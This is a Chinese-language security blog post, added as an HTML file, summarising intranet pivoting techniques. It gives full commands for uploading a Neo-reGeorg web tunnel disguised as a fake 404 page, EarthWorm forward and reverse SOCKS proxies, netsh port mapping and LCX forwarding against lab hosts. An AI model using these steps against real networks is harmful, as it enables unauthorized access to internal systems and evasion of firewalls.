@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>代理技术 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 
+
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                    <a class="menu-item" href="/link">
+                        
+                        
+                        
+                        
+                            <i class="iconfont icon-link "></i>
+                        
+                        链接
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                    <a class="menu-item" href="/link">
+                        
+                        
+                        
+                        
+                        链接
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">代理技术</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-06-21&nbsp;&nbsp;15:51:50</a> &nbsp;
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                        <!--分类:-->
+                        <i class="iconfont icon-category"></i>
+                            
+                                <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>&nbsp;
+                            
+                        </span>
+                    
+                    
+                    <span id="/2022/06/21/22-0621-01/" class="leancloud-visitors view" data-flag-title="代理技术">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>对之前学过的一些代理方法进行总结</p>
+</blockquote>
+<h1 id="概念区分："><a href="#概念区分：" class="headerlink" title="概念区分："></a>概念区分：</h1><ul>
+<li><p><strong>(端口)转发</strong></p>
+<p>转发是渗透中的一种手段，是将一个网络端口从一个网络节点转发到另一个节点的行为。结果是使一个外网用户经过一个NAT路由器到达内网IP地址的某个端口。有时候也被称为隧道</p>
+</li>
+<li><p><strong>(端口)映射</strong></p>
+<p>映射也是渗透中的一种手段，端口映射就是将外网主机IP地址的一个端口映射到内网中一台机器，提供相应的服务</p>
+</li>
+<li><p><strong>转发和映射的区别</strong></p>
+<p>端口转发，转发的重点在 “ 转 ” 上面。送快递的过来，把所有快递都交给门口保安，保安再根据每件快递上的收件人来分发。端口映射就是在大门口给每个人装个柜子，送快递的直接按收件人名字，把快递放到对应的柜子里面。</p>
+</li>
+<li><p><strong>代理</strong></p>
+<p>代理是一种<strong>结果</strong>，以端口转发和映射为技术基础。代理在很多场合是用在连接互联网的web服务上面，起到突破ip封锁，隐匿身份等作用，比如：tor洋葱浏览器。其原理是动态的端口转发。只需要本机和代理之间建立一个隧道，然后代理就可以根据本机发起的请求去动态的获取出链的地址与端口。</p>
+</li>
+<li><p><strong>内网穿透</strong></p>
+<p>内网穿透是一种<strong>目的</strong>，它使用的手段包括端口转发和映射，或者直接使用代理这一结果。很多时候我们指的内网穿透场景是指攻击机和靶机处于不同的内网中，一些回弹shell之类的手段无法直接实现，因为IP地址无法相互建立连接。这个时候需要使用常见的内网穿透工具。这些工具也是使用端口转发和映射或类似的方法来突破限制。</p>
+</li>
+</ul>
+<h1 id="Neo-reGeorg结合proxychains代理链-HTTP隧道"><a href="#Neo-reGeorg结合proxychains代理链-HTTP隧道" class="headerlink" title="Neo-reGeorg结合proxychains代理链(HTTP隧道)"></a><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a>结合<a target="_blank" rel="noopener" href="https://github.com/rofl0r/proxychains-ng">proxychains</a>代理链(HTTP隧道)</h1><p>这里用的<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a>是reGeory的重构版本，PS：reGeory就是个坑比，搞了一下午也没成功！！！</p>
+<p>Neo-reGeorg目前还在继续更新，reGeory在2016年就已经停更。相比reGeory而言，Neo-reGeorg优点更加明显</p>
+<ol>
+<li>兼容了python2和python3</li>
+<li>提高tunnel连接安全性(添加了连接密码,原版中连接是不需要密码的)</li>
+<li>提高可用性，避免特征检测(原版的源码是直接明文显示的,容易被特征检查)</li>
+<li>提高传输内容保密性(将传输内容进行了加密)</li>
+<li>应对更多的网络环境场景(相比于原版,支持的格式更多了)</li>
+</ol>
+<p>Neo-reGeory适用于公网服务器只了80端口的情况。Neo-reGeorg是用 python 写的利用Web进行代理的工具，流量通过 http 传输，也就是走http隧道。</p>
+<blockquote>
+<p>测试环境如下： 我们获取到了公网web服务器的权限，或者拥有可以向公网web服务器目录下上传任何文件的权限，但是该服务器开启了防火墙，只开放了80端口。内网中存在另一台服务器，我们要将公网web服务器设置为代理，通过公网web服务器的80端口，访问和探测内网web服务器的信息</p>
+<img src="/2022/06/21/22-0621-01/image.png" alt="img" style="zoom:80%;">
+</blockquote>
+<ol>
+<li><p>在kali上生成生成利用的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k 连接密码 -o 指定输出目录 </span><br><span class="line">python3 neoreg.py generate -k xxy -o /tmp</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-3UyTExfMiDnSxGLuDe5iBQ-0-5a2b3be54228ebbdc5929924c04f4c8a&image_process=resize,w_467.5" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-95g2x8ssNo6h2FfrcWNXSG-0-76a6296b3253c3507d64350cd0b2d722&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</p></li>
+<li><p>这里公网web服务器是用phpstudy搭建的，也就是php环境，所以这里使用tunnel.php脚本，将该脚本上传到web服务器的根目录下（其他目录也行</p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-kgApxhVKVizdJR7gQng1k1-0-cc93d12b1dbac9ffd7be7f785f2dad98&image_process=resize,w_911.25" alt="img" style="zoom:80%;">
+
+<p>因为原本公网服务器上没有tunnel.php脚本，所以访问<code>http://192.168.43.29/tunnel.php</code>肯定是404的，为了增加隐蔽性，这里我们可以重新生成一个tunnel.php并且伪造成一个404的页面，注意：404页面需要我们自己提前进行准备（当然准备别的页面也可以进行伪造）</p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-iBo3LVf24n2icjMk6MyQHz-0-4f75be5693e1764d8be28df853907224&image_process=resize,w_911.25" alt="img" style="zoom:80%;">
+
+<p><code>python3 neoreg.py generate -k xxy --file 404.html --httpcode 404.html -o /tmp/test</code></p>
+<img src="/2022/06/21/22-0621-01/image-16559097402526.png" alt="img" style="zoom:80%;">
+
+<p>然后上传新生成的tunnel.php到公网服务器的根目录下，再次访问就是伪造的404页面</p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-mL3Z5X9arJ37nkX411KEup-0-e4fce9db6f2d4cb368c7f5f0cc71e785&image_process=resize,w_911.25" alt="img" style="zoom:80%;">
+</li>
+<li><p>在kali上连接目标，此脚本会自动生成一个sockets5的代理映射在本地127.0.0.1的1080端口上以供我们使用，PS：可以用<code>-i IP</code>和<code>-P 端口</code>来更换映射的IP和端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k xxy -u http://192.168.43.29/tunnel.php --skip  # 表示本地127.0.0.1的1080端口的流量全部转发给目标地址</span><br><span class="line">注意：</span><br><span class="line">-k 连接密码，-u 目标地址  </span><br><span class="line">连接伪造页面后的tunnel.php会报错，这里直接--skip跳过即可，如果不是伪造页面的tunnel.php不需要--skip</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-qTozdQtTMonBAQeMWjS2pt-0-20c0aff3f7bed293a63d9a99e829c89f&image_process=resize,w_592.5" alt="img" style="zoom:80%;">
+
+<p>kali本地已经监听了1080端口</p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-bxJsEoe8wdAfpwEjK4zwAp-0-af62b42bd512bea1c2e939aa7df48841&image_process=resize,w_788.75" alt="img" style="zoom:80%;">
+
+<p>然后设置proxychains的配置文件（注意：2022kali自带的proxychains实际是proxychains4，但在终端中用proxychains命令也可以，对应的配置文件为proxychains4.conf，不是proxychains.conf）因为Neo-reGeorg建立的是socks5代理，所以配置文件中socks4要改成socks5</p>
+<p><code>vim /etc/proxychains4.conf</code></p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-nU7egP3th2jobrbmBSNGgs-0-6291832d09d704e7fd468d49b43afbad&image_process=resize,w_747.5" alt="img" style="zoom:80%;">
+
+<p>然后尝试用proxychains代理curl访问内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl 192.168.13.159</span><br><span class="line">PS:也可以用proxychains4 curl 192.168.13.159命令，在2022版本的kali都是一样（貌似一样。。。不是特别清楚，嘿嘿）</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-wUxjZ44Bi7wz1LjDTnext6-0-66646974b99596f3d46df7de93cfe82a&image_process=resize,w_911.25" alt="img" style="zoom:80%;">
+
+<p>流量走向为：流量-&gt;kali本地的1080端口-&gt;公网web服务器的80端口(通过我们上传的php文件进行流量转发)-&gt;内网服务器80端口</p>
+<p>注意：如果要用proxychains代理nmap进行扫描时，不能使用nmap默认的扫描方式，不能使用-A -T4参数，可以用proxychains nmap -Pn -sT -p 1-10000 -v 192.168.13.159尝试扫描</p>
+</li>
+</ol>
+<h1 id="EW-EarthWorm-结合proxychains代理链"><a href="#EW-EarthWorm-结合proxychains代理链" class="headerlink" title="EW(EarthWorm)结合proxychains代理链"></a>EW(EarthWorm)结合proxychains代理链</h1><p>EW是一套便携式的网络穿透工具，具有SOCKS5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用，跨平台，任何平台都可以轻松使用！ew包含的内容如下：（该工具19年就已经停止更新）</p>
+<img src="/2022/06/21/22-0621-01/image-165590995911713.png" alt="img" style="zoom:80%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">-l 本地要监听的端口</span><br><span class="line">-f 要主动连接的ip</span><br><span class="line">-g 要主动连接的端口</span><br><span class="line">-d 要反弹到的ip</span><br><span class="line">-e 要反弹到的端口</span><br><span class="line">-s 工作模式</span><br><span class="line"></span><br><span class="line">工作模式支持如下：</span><br><span class="line">lcx_tran 正向tcp端口转发，监听在本地</span><br><span class="line">lcx_slave 反向tcp转发客户端</span><br><span class="line">lcx_listen 反向tcp服务端</span><br><span class="line">ssocksd 创建正向socks代理服务端，监听在本地，直接把当前环境socks代理出去</span><br><span class="line">rssocks 创建反向socks代理服务端</span><br><span class="line">rcsocks 反向socks代理客户端</span><br></pre></td></tr></table></figure>
+
+<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><blockquote>
+<p> 环境：</p>
+<img src="/2022/06/21/22-0621-01/image-165590999921115.png" alt="img" style="zoom:80%;">
+</blockquote>
+<ol>
+<li><p>在跳板机上执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在跳板机上创建正向socks代理服务端，监听在本地1080端口</span><br><span class="line">ew_for_Win.exe -s ssocksd -l 1080        </span><br><span class="line"></span><br><span class="line">#注意：如果跳板机是Linux系统，执行下面的命令：</span><br><span class="line">./ew_for_linux64 -s ssocksd -l 1080     </span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image-165591011880417.png" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后在kali上配置proxychains代理链的配置文件，让proxychains代理的流量全部流向跳板机1080端口的socks服务</p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-oeRC1ZnDMesSFcSaUWoaax-0-1ed82ae149c491c6d417821c9676e53e&image_process=resize,w_396.25" alt="img" style="zoom:80%;">
+
+<p>用proxychains代理curl访问内网服务器192.168.13.159</p>
+<p><code>proxychains4 curl 192.168.13.159</code></p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-2jM9eLTNWQcoVqLVevyVhr-0-af9bca4937d9f865610d2cbeb0fad37a&image_process=resize,w_911.25" alt="img" style="zoom:80%;"></li>
+</ol>
+<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><blockquote>
+<p>环境：跳板机防火墙设置了入站规则，kali无法直接连接跳板机</p>
+<img src="/2022/06/21/22-0621-01/image-165591020501321.png" alt="img" style="zoom:80%;">
+</blockquote>
+<ol>
+<li><p>在kali上执行如下命令，创建反向socks5代理客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#kali是linux系统，用如下命令：</span><br><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888  #将发送到本地1080端口的请求全部转发到本地8888端口</span><br><span class="line"></span><br><span class="line">#如果黑客机器用的是windows系统，用如下命令</span><br><span class="line">ew_for_Win.exe -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-f5NXxAfy47UZNc4EmyFKZg-0-d39ccb73170cfe560c08758b912f5a29&image_process=resize,w_451.25" alt="img" style="zoom:80%;">
+</li>
+<li><p>由于kali无法访问跳板机，也就无法直接访问到跳板机上的socks服务。所以用反向代理，在跳板机上执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在跳板机上创建socks反向代理服务端，将跳板机上的socks服务转发到kali的8888端口上</span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.43.237 -e 8888   </span><br><span class="line"></span><br><span class="line">注意：跳板机是linux系统，则用下面命令：</span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.43.237 -e 8888</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-xodRA4iELcUgzJGw6RnHPT-0-84b4abe322e458e7b9348f67d4df3958&image_process=resize,w_758.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>在kali上配置proxychains的配置文件</p>
+</li>
+</ol>
+   <img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-bPbvExxzsr7Q9wfqs1bCeW-0-8b1a05c6a5250f15ae71b5d495294f7d&image_process=resize,w_291.25" alt="img" style="zoom:80%;">
+
+<p>   然后用proxychains代理curl成功访问到目标服务器</p>
+   <img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-a1hETsMEfxEji4gDbnFxY-0-00bb0cc9b8781734d8b458b94f2dc8d8&image_process=resize,w_911.25" alt="img" style="zoom:80%;">
+
+<h1 id="Netsh实现端口转发"><a href="#Netsh实现端口转发" class="headerlink" title="Netsh实现端口转发"></a>Netsh实现端口转发</h1><p>Netsh 是Windows自带的命令行脚本工具，它可以建立端口映射。</p>
+<blockquote>
+<p>环境：拿到公网web服务器权限后，在公网web服务器上利用Netsh实现端口映射，kali只要访问公网web服务器地址指定的端口，就相当于访问内网服务器的80端口</p>
+<img src="/2022/06/21/22-0621-01/image-165591034690727.png" alt="img" style="zoom:80%;">
+</blockquote>
+<ol>
+<li><p>在公网web服务器上执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.43.29 listenport=8080 connectaddress=192.168.13.159 connectport=80  #新建一个端口映射，将公网web服务器192.168.43.29的8080端口和192.168.13.159的80端口做个映射</span><br><span class="line"></span><br><span class="line">#注意：可通过如下命令在公网web服务器上查看建立的映射或删除映射</span><br><span class="line">netsh interface portproxy show all  #查看端口映射</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=192.168.43.29 listenport=8080 #删除端口映射</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907027-pY7iAsxYgWA8B6J6NzNADW-0-60a74a6098f2a461df58413ff89db77e&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>在kali上访问内公网服务器的8080端口就相当于成功访问内网192.168.13.159:80</p>
+<img src="/2022/06/21/22-0621-01/image.pngauth_key=1655907028-tCYqKHThaUKw5kTtwaN6eT-0-1bc1b8f325685374e77bc68a626fc6d9&image_process=resize,w_913.75" alt="img" style="zoom:80%;"></li>
+</ol>
+<h1 id="LCX实现端口转发"><a href="#LCX实现端口转发" class="headerlink" title="LCX实现端口转发"></a>LCX实现端口转发</h1><p>提起Lcx，可能大家并不会陌生，早些年被称为端口转发神器。Lcx有它的局限性，比如原始版本不支持linux（后续貌似有linux版本），不免杀等等，但lcx在某些特定的场合依然发挥着重要的作用。同样基于Socket协议。</p>
+<blockquote>
+<p>环境：拿到公网web服务器后，在公网web服务器上利用LCX进行端口转发，把内网服务器80端口转发到公网web服务器的8080端口上</p>
+<img src="/2022/06/21/22-0621-01/image-165591046623931.png" alt="img" style="zoom:80%;">
+</blockquote>
+<ol>
+<li><p>在公网服务器上执行下面命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 8080 192.168.13.159 80  #将发送到本地的8080端口的请求转发到192.168.13.159的80端口</span><br><span class="line"></span><br><span class="line">#如果公网web服务器是linux版本，执行如下命令：</span><br><span class="line">./lcx -m 3 -h1 127.0.0.1 -p1 22 -h2 192.168.13.158 </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后在kali上访问192.168.43.29:8080相当于访问内网服务器192.168.13.159:80</p>
+</li>
+</ol>
+<h1 id="Ssocks"><a href="#Ssocks" class="headerlink" title="Ssocks"></a>Ssocks</h1><p>由于Ssocks不稳定后续再补充。。。。</p>
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/06/22/22-0622-01/">x86汇编day5</a>
+            
+            
+            <a class="next" rel="next" href="/2022/06/20/22-0620-01/">x86保护模式day4</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
+
+
+	
+
+
+
+<script type="text/javascript" src="\js\jquery.js"></script>
+<script type="text/javascript" src="\js\jquery.min.js"></script>
+
+<script  type="text/javascript" src="\js\snow.js"></script>
+
